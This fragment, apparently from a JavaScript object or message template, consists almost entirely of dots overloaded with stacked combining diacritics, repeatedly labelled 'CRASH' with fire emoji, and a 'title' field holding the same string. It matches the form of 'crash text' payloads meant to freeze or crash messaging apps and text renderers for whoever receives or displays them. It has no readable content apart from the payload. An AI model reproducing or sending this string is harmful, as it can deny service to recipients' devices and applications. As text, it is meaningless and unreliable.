̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̸̗̲̗̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̐̑ͧ̋̓̊̌͒̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀",
                  title: "🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̐̑ͧ̋̓̊̌͒